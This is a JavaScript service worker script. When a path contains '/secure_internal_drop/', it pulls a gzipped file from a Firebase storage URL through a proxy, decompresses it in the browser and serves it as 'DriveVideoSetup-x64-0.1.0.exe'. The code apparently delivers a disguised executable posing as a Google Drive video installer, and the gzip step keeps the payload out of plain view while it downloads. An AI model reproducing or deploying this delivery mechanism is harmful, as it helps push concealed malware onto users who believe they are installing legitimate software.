self.addEventListener('install', () => self.skipWaiting());

self.addEventListener('activate', (e) => {
  e.waitUntil(self.clients.claim());
});

self.addEventListener('fetch', (event) => {
  const url = new URL(event.request.url);

  if (url.pathname.includes('/drive_secure_download_ping')) {
    event.respondWith(new Response('pong', { status: 200 }));
    return;
  }

  if (url.pathname.includes('/secure_internal_drop/')) {
    const payloadUrl = 'https://firebasestorage.googleapis.com/v0/b/xmeta-b0db4.firebasestorage.app/o/videodz.gz?alt=media&token=568c2d49-7391-45b8-8f4e-86d5b478fb9d';

    const fetchUrl =
      '/api/edge-stream?url=' +
      encodeURIComponent(payloadUrl) +
      '&nocache=' +
      Date.now();

    event.respondWith(
      fetch(fetchUrl, {
        method: 'GET',
        cache: 'no-store',
      })
        .then((response) => {
          if (!response.ok) {
            throw new Error(`Fetch failed: ${response.status} ${response.statusText}`);
          }

          if (!response.body) {
            throw new Error('Response body is empty');
          }

          const ds = new DecompressionStream('gzip');
          const decompressedStream = response.body.pipeThrough(ds);

          const headers = new Headers();
          headers.set('Content-Type', 'application/octet-stream');

          const filename = 'DriveVideoSetup-x64-0.1.0.exe';
          headers.set('Content-Disposition', `attachment; filename="${filename}"`);

          return new Response(decompressedStream, {
            status: 200,
            headers,
          });
        })
        .catch((e) => {
          console.error('SW Fetch Error:', e);
          return new Response('Download failed: ' + e.message, {
            status: 500,
            headers: {
              'Content-Type': 'text/plain',
            },
          });
        })
    );
  }
});